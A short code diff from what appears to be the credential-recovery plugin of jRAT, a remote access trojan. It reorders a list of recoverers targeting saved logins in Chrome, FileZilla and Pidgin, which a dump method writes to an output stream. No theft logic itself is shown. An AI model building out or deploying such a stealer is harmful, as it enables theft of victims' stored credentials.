@@ -11,9 +11,9 @@ import jrat.plugin.recovery.stub.programs.Pidgin;
 public class Recovery {
 	
 	public static final AbstractRecoverer[] RECOVERERS = new AbstractRecoverer[] {
-		new Chrome(),
 		new FileZilla(),
-		new Pidgin()
+		new Pidgin(),
+		new Chrome()
 	};
 	
 	public static void dump(DataOutputStream dos) throws Exception {
